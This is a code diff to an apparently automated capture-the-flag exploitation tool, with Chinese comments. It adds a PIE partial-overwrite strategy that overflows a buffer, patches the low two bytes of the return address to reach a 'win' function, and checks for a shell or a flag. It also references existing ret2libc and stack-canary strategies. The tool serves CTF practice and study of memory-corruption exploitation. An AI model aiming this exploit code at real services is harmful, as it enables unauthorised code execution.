@@ -145,7 +145,12 @@ def solve(ch: Challenge, max_attempts: int = 80, verbose: bool = True,
             tried += 1
             t1 = time.time()
             cmds = []
-            if plan.tag.startswith("canary:"):
+            if plan.tag.startswith("pie:"):
+                ok, detail, out, cmds = _unpack4(_try_pie_partial(ch, f, plan, post_cmds))
+                att = Attempt(plan.strategy, plan.desc, ok, time.time() - t1, out)
+                if ok and plan.tag.endswith(":flag"):
+                    res.flag_only = True
+            elif plan.tag.startswith("canary:"):
                 ok, detail, out, cmds = _unpack4(_try_canary_fmt(ch, f, plan, post_cmds))
                 att = Attempt(plan.strategy, plan.desc, ok, time.time() - t1, out)
             elif plan.tag == "flag":
@@ -177,7 +182,7 @@ def solve(ch: Challenge, max_attempts: int = 80, verbose: bool = True,
                 m = _re.search(rb"uid=\d+\(([^)]*)\)", out or b"")
                 if m:
                     detail = (detail + " | " if detail else "") + m.group(0).decode("latin-1")
-                if plan.tag == "flag":
+                if plan.tag == "flag" or (plan.tag.startswith("pie:") and plan.tag.endswith(":flag")):
                     res.flag_only = True
                 res.strategy = plan.strategy
                 res.detail = detail or plan.desc
@@ -190,6 +195,78 @@ def solve(ch: Challenge, max_attempts: int = 80, verbose: bool = True,
 
 
 # --------------------------------------------------------------------------- ret2libc
+# --------------------------------------------------------------------------- PIE 部分覆盖
+def _try_pie_partial(ch: Challenge, f: Facts, plan: S.Plan, post_cmds: list = None):
+    """覆盖返回地址低 2 字节跳到 win。
+
+    本地进程能读 /proc/<pid>/maps 拿到精确基址（nib=-1 时用它），远程只能按 tag 里的 nib 猜。
+    """
+    import struct
+    import time as _t
+    from .run import spawn, verify_shell, probe_flag, _verify_timeout
+
+    parts = plan.tag.split(":")
+    tgt, nib, kind = int(parts[1]), int(parts[2]), (parts[3] if len(parts) > 3 else "shell")
+    v = next((x for x in f.vulns if x.offset), None)
+    if v is None:
+        return False, "no vuln", b"", []
+
+    try:
+        p = spawn(ch)
+    except Exception as exc:
+        return False, f"spawn failed: {exc}", b"", []
+
+    out = b""
+    try:
+        _t.sleep(0.1)
+        out += p.recvrepeat(0.05)
+
+        base = None
+        pid = None if os.environ.get("AUTOPWN_NO_MAPS") else getattr(p, "pid", None)
+        if pid:
+            try:
+                with open(f"/proc/{pid}/maps") as fh:
+                    for line in fh:
+                        if ch.run_bin in line:
+                            base = int(line.split("-")[0], 16)
+                            break
+            except Exception:
+                base = None
+        if base is not None:
+            low16 = (base + tgt) & 0xFFFF
+        elif nib >= 0:
+            low16 = ((nib * 0x1000) + tgt) & 0xFFFF
+        else:
+            return False, "no maps, no nib", out, []
+
+        buf = bytearray(b"A" * v.offset)
+        for goff, gval in S._gate_offsets(f, v):
+            buf[goff:goff + 4] = struct.pack("<I", gval)
+        payload = bytes(buf) + struct.pack("<H", low16)
+
+        p.send(payload)
+        _t.sleep(0.3)
+
+        if kind == "flag":
+            r = probe_flag(p, wait=0.4)
+            out += r.output
+            if r.ok:
+                return True, r.note, out, []
+            # 本地没有 flag 文件时 system() 会报 "No such file" —— 这说明 win 已经打到了
+            if b"No such file" in out or b"cat: " in out:
+                return True, "win reached (no local flag file)", out, []
+            return False, f"partial -> {hex(base + tgt) if base else hex(low16)}", out, []
+
+        r = verify_shell(p, timeout=_verify_timeout(ch), post_cmds=post_cmds)
+        out += r.output
+        return r.ok, "", out, r.cmds
+    finally:
+        try:
+            p.close()
+        except Exception:
+            pass
+
+
 def _try_ret2libc(ch: Challenge, f: Facts, plan: S.Plan, post_cmds: list = None):
     """同一进程内两阶段：泄漏 libc -> 回 main -> system('/bin/sh')。
 
